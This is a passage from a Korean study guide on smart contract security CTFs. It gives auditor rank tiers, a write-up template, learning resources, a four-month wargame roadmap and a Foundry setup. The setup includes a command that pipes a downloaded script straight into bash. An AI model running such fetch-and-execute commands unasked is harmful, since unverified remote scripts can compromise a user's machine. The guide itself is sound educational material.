
**등급 체계**
```
Watson → Senior Watson → Lead Senior Watson
  ↑ 지속적인 유효 제출로 승급
  ↑ Lead: 감사 리드 역할 가능, 포상금 증가
```

**Lead Senior Watson 이점**
- 감사별 리드 역할 → 추가 수익
- 일부 프로그램 초대 전용 접근
- 커뮤니티 내 신뢰도

---

## 5. CTF 문제 풀이 후 학습법

### 5.1 Write-up 작성 습관

문제 풀이 후 반드시 write-up 작성:
```markdown
# [대회명] [문제명] Write-up

## 문제 요약
## 초기 분석
## 취약점 발견 과정
## 익스플로잇 구현
## PoC 코드
## 배운 점
## 참고 자료
```

### 5.2 커뮤니티 참여

- DeFiHackLabs Discord
- Secureum Discord (RACE 참가자)
- Code4rena Discord
- Twitter/X: @tinchoabbate, @PatrickAlphaC, @bytes032, @pashovkrum

### 5.3 학습 자료 추천

**책**
- "Mastering Ethereum" - Andreas Antonopoulos
- "Smart Contract Security Field Guide" - Secureum

**블로그/뉴스레터**
- https://ventral.digital (Secureum RACE 해설)
- https://medium.com/@cmichel (CTF 풀이)
- https://noxx.substack.com (EVM 심층 분석)

**유튜브**
- Patrick Collins (Foundry 강좌)
- Smart Contract Programmer
- Secureum Bootcamp 녹화본

---

## 6. 월별 학습 로드맵

### Month 1: 기초 (Ethernaut + NodeGuardians 입문)
- Week 1-2: Ethernaut 0-15번 + NodeGuardians Token Standards, Understanding Storage
- Week 3-4: Ethernaut 16-29번 + EVM Puzzles + NodeGuardians Proxy Contracts

### Month 2: DeFi 심화 (Damn Vulnerable DeFi + 어셈블리)
- Week 1-2: DVDeFi 1-9번 + NodeGuardians Learning Assembly
- Week 3-4: DVDeFi 10-18번 + NodeGuardians Gas Optimization

### Month 3: 고급 + 실전 전환
- Week 1: Ethernaut 30-40번 (ECDSA, EIP-7702, 롤업 보안)
- Week 2: Mr Steal Yo Crypto + NodeGuardians Get Rekt 캠페인
- Week 3: DeFiHackLabs 재현 5건
- Week 4: Secureum RACE 과거 문제 + Remedy CTF 2025 과거 문제 풀이

### Month 4: 대회 참가
- Code4rena 첫 감사 참여
- Paradigm CTF / Remedy CTF 과거 문제 도전
- NodeGuardians ZK/L2 트랙 (Cairo, Noir, zkSync, OP Stack)
- 첫 버그바운티 보고서 제출

---

## 7. 환경 설정

### Foundry 설치 및 기본 설정

```bash
# Foundry 설치
curl -L https://foundry.paradigm.xyz | bash
foundryup

# 프로젝트 초기화
forge init ctf-workspace
cd ctf-workspace

# 의존성 추가
forge install OpenZeppelin/openzeppelin-contracts
forge install foundry-rs/forge-std

# .env 설정
echo "ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY" > .env
echo "SEPOLIA_RPC_URL=https://eth-sepolia.g.alchemy.com/v2/YOUR_KEY" >> .env
```

### 유용한 alias

```bash
# ~/.zshrc 또는 ~/.bashrc
alias ft="forge test -vvv"
alias ftf="forge test -vvvv --match-test"
alias fth="forge test --gas-report"
alias cs="cast storage"
alias cc="cast call"
alias cs4="cast sig"
```

---

*이 챕터를 마치면 독자는 주요 워게임 플랫폼을 모두 경험하고, 실전 CTF 대회와 버그바운티 프로그램에 참가할 준비를 갖추게 된다.*
